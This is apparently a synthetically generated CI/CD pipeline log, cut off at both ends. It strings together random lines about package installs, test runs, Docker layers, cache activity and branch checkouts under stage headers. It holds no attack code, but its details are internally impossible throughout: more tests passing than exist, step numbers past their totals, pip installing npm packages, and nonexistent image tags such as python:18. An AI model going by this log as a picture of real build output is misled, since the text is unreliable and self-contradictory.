failed with exit code 80\nUsing Python 3.11\nArtifact uploaded: build.tar.gz (17MB)\n[12:17:55] INFO: Connecting to database\nFAILED: test_cache_hit\n[12:17:55] DEBUG: Memory usage: 718MB\nImage pulled successfully\nSwitched to branch 'feature/task-795'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /upload - 202 (410ms)\n  PASS: test_user_create (186ms)\nHEAD is now at 6bbdfb9\nArtifact uploaded: build.tar.gz (6MB)\n\u2713 Step 'checkout' succeeded\nCoverage: 76% statements, 98% branches\nTLS handshake completed\nLoading...\nPlatform: win32-x64\nHEAD is now at 2d21566\nCreating production build...\n  PASS: unit/test_api_health.spec.js\nTime: 85.458s\npip: Downloading prettier-4.10.tar.gz\nCache invalidated: dependencies\n\u2713 Task completed in 1020ms\nCache miss for key-7607\nConnecting to test.io:443...\nBuilding Docker image...\nFetching submodules...\nStep 12/21: Linting\nVerifying...\nFinished.\nConnecting to example.com:443...\nImage pulled successfully\nPushing to registry...\n\u2713 Step 'test' succeeded\n[12:17:55] DEBUG: Connection pool: 5 active\nCompiling src/app.ts...\nConnection established\nCache hit for key-3128\nSwitched to branch 'hotfix/task-112'\nStep 1/22: Running migrations\n  PASS: test_db_connect (141ms)\nLoading...\nEnvironment: test\nInstalling webpack@5.13.8\n\u2713 package completed\nFAILED: test_db_connect\n[12:17:55] DEBUG: Connection pool: 7 active\nCache hit for key-9716\n\u2717 build failed with exit code 9\n[12:17:55] WARN: Deprecated API usage\nPlatform: linux-x64\nConnection established\nHEAD is now at c3b5c4a\n[12:17:55] DEBUG: Connection pool: 18 active\nnpm notice: created a lockfile\nUsing Node.js 15.3.3\n[12:17:55] WARN: Deprecated API usage\nPOST /api - 201 (176ms)\nTransforming 184 files...\nUsing Python 3.12\nFinished.\nProcessing...\nOK\nStep 18/25: Installing dependencies\nWARNING: eslint has known vulnerabilities\n[12:17:55] WARN: Deprecated API usage\nCache restored successfully (329MB)\nFinished.\nOK\n[12:17:55] INFO: Request completed\nStep 2/24: Installing dependencies\n[12:17:55] INFO: Processing request\n  PASS: test_db_connect (85ms)\nFinished.\nTransforming 639 files...\nTime: 96.896s\nGET /api - 204 (95ms)\n[12:17:55] DEBUG: Query executed in 65ms\nGET /health - 201 (81ms)\nException: NullPointerException\n\u2713 Step 'build' succeeded\nLayer 6/10: RUN command\nGenerating source maps...\nArtifact uploaded: dist.zip (66MB)\nWARNING: jest has known vulnerabilities\n[12:17:55] WARN: Deprecated API usage\nRan 195 tests in 51s\nHEAD is now at 5d91427\nWaiting...\n\u2713 Step 'build' succeeded\nPlatform: linux-x64\nSuccess!\nPlatform: darwin-arm64\nStep 7/18: Installing dependencies\nStep 9/17: Running migrations\nnpm notice: package.json updated\nConnection established\nRan 52 tests in 7s\nOK\n\u2713 All checks passed\nProcessing...\n[12:17:55] DEBUG: Connection pool: 18 active\nStep 13/20: Testing\nnpm install: resolved 797 packages\nnpm install: added 189 packages\n[12:17:55] INFO: Request completed\nWARNING: webpack has known vulnerabilities\nLayer 4/10: RUN command\nFinished.\nProcessing...\n[12:17:55] INFO: Starting build process\n[12:17:55] INFO: Cache refreshed\nArtifact downloaded: 41MB\npip: Collecting react\n  PASS: unit/test_auth_login.spec.js\nCompiling src/utils.go...\nTime: 24.894s\n[12:17:55] DEBUG: Memory usage: 1421MB\n\u2717 build failed with exit code 118\nPOST /upload - 201 (381ms)\nImage pulled successfully\nCache saved successfully\n[12:17:55] INFO: Request completed\nTests: 437 passed, 253 total\nTest Suites: 39 passed, 6 total\nCache restored successfully (147MB)\n  PASS: unit/test_auth_login.spec.js\nUsing Python 3.10\nCache miss for key-4244\nOK\nArtifact uploaded: build.tar.gz (48MB)\n\u2717 build failed with exit code 77\n[12:17:55] DEBUG: Loading configuration\nAlready up to date.\nTime: 112.802s\nStep 13/22: Running migrations\nNODE_ENV=production\nStep 1/25: Building\nTransforming 163 files...\nnpm install: resolved 181 packages\nReady.\nWaiting...\nTime: 28.739s\nArtifact uploaded: build.tar.gz (11MB)\nCache saved successfully\nSuccess!\nTest Suites: 46 passed, 5 total\nCache saved successfully\npip install: Successfully installed webpack-4.12\nnpm install: added 152 packages\n[12:17:55] INFO: Request completed\n[12:17:55] DEBUG: Connection pool: 20 active\nUploading artifact 'coverage' (22 files)\n[12:17:55] DEBUG: Query executed in 6ms\nStep 16/16: Testing\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 Task completed in 3866ms\n=== Step save_cache completed ===\n=== Step: integration_tests ===\nChecking out master branch\n[12:17:55] WARN: Deprecated API usage\nnpm notice: package.json updated\nCompleted.\n\u2713 All checks passed\nLayer 6/13: COPY command\nPushing to registry...\nCache hit for key-2735\nStep 14/20: Testing\nArtifact uploaded: dist.zip (63MB)\nStep 13/25: Testing\nDone.\nFinished.\n[12:17:55] INFO: Request completed\nLoading...\n\u2713 Step 'test' succeeded\nUsing Node.js 15.4.0\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 3MB\nCompleted.\nCache saved successfully\nChecking out main branch\nTLS handshake completed\n  PASS: test_api_health (86ms)\nUsing Python 3.11\nCoverage: 83% statements, 93% branches\nInstalling express@4.7.5\nPlatform: linux-x64\n  PASS: test_cache_hit (268ms)\nGET /health - 200 (22ms)\npip: Installing build dependencies...\n[12:17:55] WARN: Deprecated API usage\npip install: Successfully installed lodash-3.9\nCache hit for key-5032\nyarn add: Done in 7.74s\nPulling image: node:18\nCoverage: 88% statements, 88% branches\nTransforming 828 files...\n[12:17:55] INFO: Starting build process\n[12:17:55] INFO: Cache refreshed\nLayer 8/11: ENV command\n  PASS: test_db_connect (337ms)\nLoading...\nBundling styles.js\nTLS handshake completed\n[12:17:55] DEBUG: Memory usage: 1860MB\nyarn add: Done in 3.38s\n[12:17:55] WARN: Deprecated API usage\nWARNING: webpack has known vulnerabilities\nTests: 177 passed, 242 total\nBundling runtime.css\nVerifying...\npip: Downloading express-1.2.tar.gz\nPlatform: win32-x64\nCreating production build...\nSuccess!\n[12:17:55] DEBUG: Connection pool: 16 active\nAlready up to date.\nStep 2/24: Running migrations\nPOST /upload - 201 (16ms)\n[12:17:55] DEBUG: Connection pool: 16 active\n[12:17:55] INFO: Connecting to database\nStep 3/18: Installing dependencies\nEnvironment: production\n[12:17:55] DEBUG: Query executed in 90ms\n  PASS: unit/test_api_health.spec.js\n[12:17:55] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/25: Building\nLayer 8/8: COPY command\nWARNING: lodash has known vulnerabilities\nCompiling src/index.js...\nTLS handshake completed\nnpm install: added 318 packages\nSuccess!\nEnvironment: production\nStep 20/18: Linting\nCache invalidated: dependencies\nTests: 262 passed, 319 total\nGenerating source maps...\nVerifying...\nStep 19/19: Running migrations\nCompiling utils/index.js...\nGenerating source maps...\nUsing Python 3.9\nArtifact downloaded: 24MB\nStep 1/22: Deploying\nGenerating source maps...\nPulling image: node:3.11\npip: Downloading webpack-5.16.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFAILED: test_auth_login\nSuccess!\nArtifact uploaded: dist.zip (45MB)\n[12:17:55] WARN: Deprecated API usage\nBundling styles.js\nGET /status - 204 (16ms)\nCache miss for key-2500\nInstalling react@4.5.10\nFetching submodules...\nOK\nnpm notice: package.json updated\nStep 15/16: Deploying\nTransforming 219 files...\nHEAD is now at efe567b\n[12:17:55] DEBUG: Loading configuration\nCompleted.\n[12:17:55] INFO: Processing request\nWARNING: prettier has known vulnerabilities\nOK\nCache hit for key-2288\n[12:17:55] WARN: Deprecated API usage\nStep 14/15: Deploying\nCache saved successfully\n[12:17:55] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 63.156s\nAlready up to date.\nUsing Python 3.10\nEnvironment: test\nCompiling lib/handler.rs...\nArtifact uploaded: build.tar.gz (23MB)\nnpm install: added 200 packages\nReady.\nCompiling lib/index.js...\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:17:55] INFO: Request completed\nCompiling utils/main.py...\nLayer 6/15: RUN command\n[12:17:55] INFO: Connecting to database\nUploading artifact 'build' (8 files)\nCreating production build...\nLoading...\n[12:17:55] INFO: Processing request\nChecking out main branch\nPushing to registry...\nnpm install: added 55 packages\npip: Downloading express-4.8.tar.gz\n\u2713 test completed\nInstalling prettier@1.4.8\npip: Collecting eslint\nCache saved successfully\nSwitched to branch 'bugfix/task-919'\nImage pulled successfully\nArtifact downloaded: 42MB\n[12:17:55] INFO: Request completed\n\u2713 package completed\nNODE_ENV=production\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (34MB)\nVerifying...\n[12:17:55] INFO: Starting build process\npip install: Successfully installed express-1.14\n\u2713 Task completed in 1670ms\nSnapshots: 31 passed, 31 total\n[12:17:55] DEBUG: Memory usage: 330MB\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPushing to registry...\nLoading...\nTLS handshake completed\nMinifying app.js\nException: ValueError\nGenerating source maps...\nGenerating source maps...\nPushing to registry...\nSwitched to branch 'feature/task-285'\nUsing Python 3.11\nNODE_ENV=production\nCoverage: 77% statements, 92% branches\nStep 12/20: Linting\n[12:17:55] INFO: Starting build process\nMinifying app.js\nGET /status - 200 (69ms)\nnpm install: resolved 1072 packages\nUploading artifact 'coverage' (2 files)\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (16MB)\nNODE_ENV=development\nHEAD is now at f32a1fb\nBundling runtime.css\nStep 4/22: Deploying\nFinished.\nPushing to registry...\nWaiting...\n  PASS: test_cache_hit (270ms)\n[12:17:55] INFO: Starting build process\nCompiling utils/service.java...\nCreating production build...\n[12:17:55] DEBUG: Loading configuration\nCache hit for key-9962\nImage pulled successfully\nCache hit for key-5143\nMinifying vendor.js\nUsing Python 3.11\nLoading...\nCompiling utils/index.js...\n[12:17:55] INFO: Starting build process\nPushing to registry...\nVerifying...\n[12:17:55] DEBUG: Connection pool: 1 active\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nChecking out develop branch\nCache hit for key-5910\nTransforming 249 files...\nUsing Python 3.11\nWARNING: express has known vulnerabilities\nInstalling prettier@4.16.1\nCache hit for key-4927\nDone.\nCompiling components/main.py...\nPOST /api - 202 (444ms)\nPushing to registry...\nnpm install: resolved 716 packages\nCache hit for key-7737\n[12:17:55] DEBUG: Initializing service\nLayer 5/8: ENV command\nUploading artifact 'dist' (34 files)\nConnection established\nHEAD is now at 525117c\nOK\n\u2717 build failed with exit code 83\nPlatform: darwin-arm64\nPulling image: python:3.11\npip: Installing build dependencies...\nTLS handshake completed\n  PASS: e2e/test_cache_hit.spec.js\nyarn add: Done in 5.1s\nBuilding Docker image...\nImage pulled successfully\nCache restored successfully (386MB)\nStep 15/23: Linting\nOK\nOK\nCompiling lib/handler.rs...\n\u2717 build failed with exit code 55\nLoading...\n[12:17:55] INFO: Starting build process\nAlready up to date.\nnpm install: resolved 445 packages\nConnection established\n[12:17:55] INFO: Request completed\nException: NullPointerException\nEnvironment: development\nCompleted.\n[12:17:55] WARN: Deprecated API usage\nnpm install: resolved 1357 packages\nStep 20/19: Testing\npip install: Successfully installed express-1.16\n[12:17:55] DEBUG: Memory usage: 526MB\nUploading artifact 'build' (22 files)\nCoverage: 84% statements, 70% branches\nConnecting to example.com:443...\nSwitched to branch 'bugfix/task-950'\n\u2713 Step 'build' succeeded\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\nPOST /data - 200 (143ms)\nConnection established\nImage pulled successfully\nPushing to registry...\nStep 15/16: Installing dependencies\nSwitched to branch 'bugfix/task-284'\nImage pulled successfully\nnpm notice: package.json updated\nCreating production build...\nSwitched to branch 'feature/task-586'\nWaiting...\n\u2713 All checks passed\nTime: 93.900s\nLoading...\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\nDone.\nWaiting...\nGenerating source maps...\nWARNING: webpack has known vulnerabilities\nnpm install: added 477 packages\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\n[12:17:55] DEBUG: Loading configuration\nnpm notice: created a lockfile\nCache saved successfully\npip: Collecting jest\nVerifying...\nWaiting...\n[12:17:55] DEBUG: Connection pool: 14 active\nConnection established\nCache saved successfully\nChecking out master branch\nNODE_ENV=test\nCache saved successfully\nCompiling components/main.py...\nArtifact downloaded: 38MB\npip: Installing build dependencies...\nCreating production build...\nCompiling src/index.js...\nStep 14/23: Deploying\nBuilding Docker image...\nCreating production build...\nnpm notice: package.json updated\nCache invalidated: node_modules\nProcessing...\n\u2713 Step 'setup' succeeded\nInstalling jest@2.3.4\nNODE_ENV=production\n[12:17:55] DEBUG: Memory usage: 299MB\nRan 115 tests in 49s\nCache restored successfully (117MB)\nPushing to registry...\nStep 8/16: Linting\nArtifact uploaded: dist.zip (69MB)\nLoading...\nConnecting to startup.dev:443...\nArtifact uploaded: build.tar.gz (2MB)\nCoverage: 97% statements, 96% branches\nnpm notice: created a lockfile\nNODE_ENV=test\npip install: Successfully installed prettier-1.14\n[12:17:55] INFO: Processing request\n[12:17:55] ERROR: Connection failed\nnpm notice: package.json updated\nEnvironment: development\nUploading artifact 'build' (25 files)\nWARNING: lodash has known vulnerabilities\n[12:17:55] DEBUG: Memory usage: 1424MB\n[12:17:55] DEBUG: Memory usage: 1867MB\nCoverage: 79% statements, 98% branches\nnpm notice: package.json updated\n[12:17:55] WARN: Deprecated API usage\nStep 8/15: Installing dependencies\nCompiling components/index.js...\nImage pulled successfully\n[12:17:55] WARN: Deprecated API usage\nException: TypeError\npip: Downloading express-1.3.tar.gz\nWARNING: lodash has known vulnerabilities\nAlready up to date.\n[12:17:55] DEBUG: Memory usage: 1553MB\nTime: 106.289s\nUsing Python 3.11\nMinifying app.js\nException: ValueError\nWARNING: eslint has known vulnerabilities\nAlready up to date.\nInstalling express@4.19.5\nStep 6/17: Installing dependencies\n\u2713 Step 'setup' succeeded\nCoverage: 88% statements, 81% branches\nBundling runtime.js\nPOST /data - 200 (172ms)\nConnection established\nCache miss for key-9049\nBundling vendor.css\npip: Downloading webpack-3.8.tar.gz\nEnvironment: test\nSnapshots: 28 passed, 23 total\nPushing to registry...\nTime: 26.595s\nWaiting...\nTime: 55.930s\nSwitched to branch 'hotfix/task-362'\nStep 10/19: Building\nTests: 152 passed, 456 total\nCompiling lib/service.java...\nChecking out develop branch\nOptimizing 19 modules...\nStep 17/16: Testing\nCache hit for key-5103\nCoverage: 74% statements, 80% branches\n[12:17:55] DEBUG: Memory usage: 604MB\nCache invalidated: build\n\u2713 Step 'checkout' succeeded\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:17:55] INFO: Connecting to database\nStep 9/25: Linting\nPulling image: python:3.11\nWARNING: prettier has known vulnerabilities\nEnvironment: production\n[12:17:55] WARN: Deprecated API usage\nException: ValueError\npip: Downloading lodash-1.2.tar.gz\nCoverage: 72% statements, 87% branches\nStep 20/25: Running migrations\nCreating production build...\n[12:17:55] INFO: Cache refreshed\nCache invalidated: node_modules\nPlatform: darwin-arm64\nLayer 2/15: ENV command\n[12:17:55] INFO: Processing request\nNODE_ENV=production\nCompiling components/service.java...\nUploading artifact 'dist' (15 files)\nVerifying...\nFinished.\n  PASS: e2e/test_auth_login.spec.js\n  PASS: e2e/test_db_connect.spec.js\nProcessing...\nGenerating source maps...\n[12:17:55] WARN: Deprecated API usage\nSwitched to branch 'hotfix/task-811'\nException: RuntimeError\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\n[12:17:55] DEBUG: Query executed in 44ms\n[12:17:55] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (79MB)\nPushing to registry...\nStep 8/16: Linting\nProcessing...\nImage pulled successfully\nStep 12/25: Deploying\nInstalling webpack@2.14.5\nLoading...\n[12:17:55] WARN: Deprecated API usage\nNODE_ENV=development\nLayer 6/9: ENV command\nMinifying app.js\n[12:17:55] INFO: Starting build process\nStep 13/19: Deploying\nStep 2/23: Linting\nCompiling components/main.py...\nUsing Python 3.10\n[12:17:55] DEBUG: Connection pool: 18 active\n[12:17:55] DEBUG: Query executed in 67ms\nReady.\nPlatform: win32-x64\npip: Downloading axios-3.0.tar.gz\nSwitched to branch 'hotfix/task-560'\n[12:17:55] ERROR: Connection failed\nLoading...\n\u2713 Task completed in 1233ms\nSwitched to branch 'feature/task-834'\nAlready up to date.\nLayer 6/13: ENV command\nSwitched to branch 'hotfix/task-362'\nException: NullPointerException\n[12:17:55] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/handler.rs...\nCreating production build...\nGET /status - 201 (82ms)\n[12:17:55] DEBUG: Memory usage: 1604MB\n[12:17:55] INFO: Connecting to database\nCoverage: 99% statements, 81% branches\nBundling main.js\nInstalling express@4.9.0\nArtifact uploaded: dist.zip (12MB)\nSnapshots: 39 passed, 41 total\nnpm notice: package.json updated\n[12:17:55] WARN: Deprecated API usage\nPushing to registry...\nPOST /data - 200 (31ms)\nCache miss for key-1852\nStep 13/23: Linting\nEnvironment: production\nnpm notice: package.json updated\nMinifying app.js\n\u2717 build failed with exit code 72\nMinifying vendor.js\nOK\n[12:17:55] WARN: Deprecated API usage\nCache restored successfully (283MB)\nCache hit for key-1233\n[12:17:55] WARN: Deprecated API usage\nStep 8/25: Installing dependencies\n\u2713 Step 'checkout' succeeded\nWaiting...\nUsing Python 3.12\nCompiling utils/handler.rs...\nPOST /api - 201 (66ms)\nCreating production build...\nStep 20/20: Running migrations\nException: RuntimeError\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 10/25: Building\nWaiting...\nArtifact uploaded: build.tar.gz (42MB)\nCoverage: 97% statements, 86% branches\nCache restored successfully (272MB)\nStep 9/25: Installing dependencies\nVerifying...\nLoading...\nAlready up to date.\nCache miss for key-5755\nCoverage: 70% statements, 99% branches\nVerifying...\nCache invalidated: node_modules\n\u2713 Step 'install' succeeded\nConnecting to example.com:443...\nSnapshots: 28 passed, 39 total\nCache invalidated: dependencies\nnpm notice: package.json updated\nStep 2/19: Running migrations\nUsing Node.js 19.6.3\nStep 14/25: Linting\n\u2713 build completed\n\u2717 build failed with exit code 51\nCoverage: 73% statements, 73% branches\nArtifact uploaded: dist.zip (97MB)\n[12:17:55] DEBUG: Loading configuration\npip: Collecting prettier\nCoverage: 81% statements, 83% branches\nWARNING: eslint has known vulnerabilities\nFetching submodules...\nnpm notice: created a lockfile\nStep 17/23: Building\n[12:17:55] INFO: Connecting to database\nCache restored successfully (134MB)\n[12:17:55] INFO: Starting build process\n[12:17:55] WARN: Deprecated API usage\nCompleted.\nCompiling lib/handler.rs...\nLoading...\nRan 125 tests in 41s\nSnapshots: 25 passed, 30 total\nStep 2/23: Installing dependencies\nSwitched to branch 'feature/task-939'\n  PASS: test_api_health (2ms)\nHEAD is now at f7e0675\n[12:17:55] INFO: Starting build process\nStep 20/17: Deploying\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWARNING: express has known vulnerabilities\nStep 17/23: Linting\n[12:17:55] DEBUG: Loading configuration\nOptimizing 89 modules...\nnpm install: resolved 1188 packages\nMinifying app.js\nAlready up to date.\n[12:17:55] DEBUG: Query executed in 76ms\nChecking out develop branch\nSnapshots: 13 passed, 28 total\nStep 11/22: Running migrations\nLayer 9/15: ENV command\nnpm install: resolved 405 packages\nTest Suites: 24 passed, 22 total\n[12:17:55] INFO: Request completed\npip: Downloading jest-5.9.tar.gz\nOK\nLoading...\nGET /health - 200 (61ms)\nUsing Node.js 16.0.2\nBuilding Docker image...\nWaiting...\nChecking out main branch\n[12:17:55] INFO: Starting build process\npip: Downloading axios-3.13.tar.gz\nLoading...\nVerifying...\nCompiling components/main.py...\n  PASS: test_auth_login (175ms)\nCompiling lib/handler.rs...\nUsing Python 3.9\n[12:17:55] INFO: Connecting to database\nCompiling src/handler.rs...\nyarn add: Done in 15.45s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 1447ms\nCache hit for key-7490\nConnecting to startup.dev:443...\nHEAD is now at 33afe94\nCompleted.\nCache invalidated: dependencies\nLoading...\nCompiling utils/app.ts...\nFinished.\nStep 12/20: Installing dependencies\nImage pulled successfully\nStep 15/17: Running migrations\npip: Collecting axios\nCache miss for key-3615\nWARNING: lodash has known vulnerabilities\n[12:17:55] WARN: Deprecated API usage\npip: Collecting axios\nGenerating source maps...\nSuccess!\n[12:17:55] ERROR: Connection failed\nSwitched to branch 'bugfix/task-551'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Task completed in 485ms\nCoverage: 70% statements, 62% branches\nCompiling src/app.ts...\nFetching submodules...\nStep 16/20: Building\nCache restored successfully (498MB)\nPulling image: python:3.11\nLoading...\nStep 15/23: Building\n  PASS: test_user_create (265ms)\nBuilding Docker image...\nTests: 171 passed, 357 total\nException: TypeError\nLayer 4/10: COPY command\nCache miss for key-6977\nInstalling eslint@3.17.9\npip: Installing build dependencies...\n[12:17:55] DEBUG: Loading configuration\npip install: Successfully installed eslint-3.20\nMinifying app.js\nCache miss for key-6051\nCompiling utils/utils.go...\nnpm notice: created a lockfile\n[12:17:55] INFO: Cache refreshed\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\nFinished.\nUploading artifact 'dist' (49 files)\nNODE_ENV=production\nStep 8/23: Installing dependencies\nStep 17/15: Linting\nBuilding Docker image...\n\u2713 deploy completed\nCache saved successfully\nTime: 31.22s\nSnapshots: 29 passed, 1 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 12/24: Running migrations\nGET /api - 201 (22ms)\nnpm install: added 91 packages\npip install: Successfully installed jest-2.8\n[12:17:55] DEBUG: Memory usage: 1254MB\nCache hit for key-8080\n[12:17:55] INFO: Cache refreshed\nCompiling lib/main.py...\nCompiling lib/handler.rs...\nnpm install: resolved 554 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip install: Successfully installed axios-4.6\npip: Installing build dependencies...\nFAILED: test_db_connect\nFetching submodules...\nEnvironment: test\nSuccess!\nCache restored successfully (120MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:55] WARN: Deprecated API usage\nInstalling webpack@4.20.2\nProcessing...\nCompiling utils/app.ts...\nProcessing...\nPulling image: alpine:3.11\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'dist' (3 files)\n\u2717 build failed with exit code 9\nStep 18/22: Testing\nTime: 120.316s\nReady.\nBuilding Docker image...\n[12:17:55] WARN: Deprecated API usage\n\u2713 All checks passed\n[12:17:55] DEBUG: Initializing service\nArtifact uploaded: dist.zip (74MB)\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\n\u2713 All checks passed\n[12:17:55] INFO: Request completed\nSnapshots: 13 passed, 32 total\nLayer 10/9: ENV command\nException: NullPointerException\nCache hit for key-1851\nTest Suites: 11 passed, 29 total\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:55] WARN: Deprecated API usage\nUsing Python 3.10\nInstalling lodash@5.2.2\nStep 11/18: Testing\nImage pulled successfully\npip install: Successfully installed express-2.15\nCache miss for key-8050\nPulling image: node:3.11\nConnection established\nStep 12/25: Linting\nBundling main.css\npip: Installing build dependencies...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: resolved 1574 packages\nTransforming 642 files...\nDone.\nBundling vendor.css\n[12:17:55] WARN: Deprecated API usage\nCompiling src/utils.go...\nCompiling components/main.py...\n[12:17:55] INFO: Starting build process\nWaiting...\nCompiling src/service.java...\nCache miss for key-7315\nConnection established\npip: Installing build dependencies...\nOptimizing 62 modules...\n\u2713 lint completed\nPOST /data - 202 (338ms)\nCompiling lib/index.js...\nCache hit for key-4510\nGET /status - 200 (100ms)\n[12:17:55] DEBUG: Loading configuration\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (48MB)\nStep 19/17: Linting\nFetching submodules...\nNODE_ENV=test\nPOST /api - 200 (378ms)\nMinifying vendor.js\nNODE_ENV=production\npip: Installing build dependencies...\nPushing to registry...\npip: Installing build dependencies...\nVerifying...\n[12:17:55] INFO: Starting build process\nHEAD is now at 064253d\nnpm notice: package.json updated\nFinished.\nStep 19/21: Running migrations\nConnecting to startup.dev:443...\nPushing to registry...\nBuilding Docker image...\n[12:17:55] DEBUG: Query executed in 11ms\nTransforming 649 files...\nCache invalidated: node_modules\nGenerating source maps...\nSwitched to branch 'hotfix/task-934'\nArtifact uploaded: dist.zip (39MB)\nyarn add: Done in 10.87s\nnpm install: resolved 1596 packages\npip: Collecting lodash\nGenerating source maps...\nRan 170 tests in 42s\nNODE_ENV=test\nTests: 106 passed, 415 total\nAlready up to date.\nImage pulled successfully\nBuilding Docker image...\nSuccess!\nReady.\nEnvironment: test\n  PASS: e2e/test_auth_login.spec.js\nRan 18 tests in 21s\nBundling vendor.js\nCompiling components/utils.go...\nMinifying vendor.js\nFAILED: test_db_connect\nCache invalidated: build\nImage pulled successfully\nnpm notice: created a lockfile\nImage pulled successfully\nStep 8/15: Linting\nReady.\nException: NullPointerException\nHEAD is now at b17223f\nBuilding Docker image...\npip: Installing build dependencies...\nOK\nCache saved successfully\nCreating production build...\nyarn add: Done in 15.82s\nUsing Python 3.11\nTests: 66 passed, 258 total\nnpm install: added 496 packages\nTLS handshake completed\nSnapshots: 21 passed, 12 total\nConnection established\nCompiling components/utils.go...\nCache saved successfully\nCreating production build...\nTest Suites: 17 passed, 7 total\nGET /api - 200 (16ms)\n[12:17:55] DEBUG: Connection pool: 10 active\nUsing Node.js 18.16.1\nnpm install: resolved 784 packages\nBuilding Docker image...\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nImage pulled successfully\n[12:17:55] WARN: Deprecated API usage\nCompiling components/app.ts...\n[12:17:55] WARN: Deprecated API usage\n\u2717 build failed with exit code 59\nSwitched to branch 'hotfix/task-583'\nArtifact uploaded: build.tar.gz (39MB)\nSuccess!\nPOST /data - 200 (192ms)\nArtifact uploaded: build.tar.gz (40MB)\nBundling main.css\nPlatform: darwin-arm64\npip install: Successfully installed express-1.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nArtifact downloaded: 34MB\nMinifying vendor.js\nnpm install: resolved 1541 packages\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] DEBUG: Initializing service\n[12:17:55] INFO: Starting build process\n\u2713 All checks passed\nEnvironment: staging\npip: Installing build dependencies...\nArtifact downloaded: 6MB\nFAILED: test_api_health\nCompiling lib/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Python 3.9\nFAILED: test_cache_hit\n=== Step e2e_tests completed ===\n=== Step: build ===\nnpm install: added 400 packages\nnpm install: added 229 packages\n[12:17:55] ERROR: Connection failed\nOK\n\u2713 Task completed in 3055ms\nCache hit for key-3764\nStep 11/17: Testing\nStep 18/22: Running migrations\n  PASS: e2e/test_api_health.spec.js\nFetching submodules...\nAlready up to date.\nGenerating source maps...\nStep 15/23: Building\nDone.\nyarn add: Done in 20.60s\nPulling image: python:18\nStep 14/18: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nLoading...\nLoading...\nConnection established\nBundling vendor.js\n\u2713 Step 'setup' succeeded\nCompleted.\n[12:17:55] DEBUG: Query executed in 54ms\nHEAD is now at 323b02f\n[12:17:55] INFO: Request completed\nFinished.\nStep 17/15: Linting\n[12:17:55] WARN: Deprecated API usage\nFinished.\nConnection established\n  PASS: test_auth_login (300ms)\nBundling styles.js\nCompiling components/service.java...\n\u2713 validate completed\nConnecting to acme.corp:443...\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] INFO: Connecting to database\nCoverage: 83% statements, 83% branches\n  PASS: test_auth_login (304ms)\nSnapshots: 15 passed, 23 total\nRan 31 tests in 54s\npip: Downloading eslint-3.4.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\nPushing to registry...\n[12:17:55] DEBUG: Query executed in 40ms\nTest Suites: 18 passed, 9 total\nOK\n  PASS: e2e/test_auth_login.spec.js\nCompiling utils/app.ts...\nFetching submodules...\nArtifact uploaded: build.tar.gz (4MB)\nNODE_ENV=test\nCompiling lib/index.js...\nWARNING: prettier has known vulnerabilities\n[12:17:55] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at c66ca8f\nPulling image: node:18\n[12:17:55] DEBUG: Initializing service\npip: Collecting jest\nMinifying vendor.js\nGenerating source maps...\nStep 4/21: Testing\nStep 7/24: Installing dependencies\nStep 4/16: Building\nOptimizing 19 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: dependencies\nException: NullPointerException\nArtifact uploaded: build.tar.gz (13MB)\nCoverage: 99% statements, 89% branches\nInstalling prettier@1.4.8\nStep 19/22: Installing dependencies\nCache hit for key-3195\n  PASS: test_auth_login (195ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:17:55] DEBUG: Initializing service\nException: RuntimeError\nArtifact uploaded: build.tar.gz (34MB)\nTest Suites: 32 passed, 23 total\n[12:17:55] ERROR: Connection failed\nGET /status - 201 (41ms)\nCreating production build...\nConnecting to acme.corp:443...\nOK\nHEAD is now at 6436bd4\nCache invalidated: dependencies\nCache restored successfully (174MB)\nCompiling utils/handler.rs...\nArtifact uploaded: build.tar.gz (24MB)\nWaiting...\n[12:17:55] WARN: Deprecated API usage\npip: Installing build dependencies...\npip: Downloading 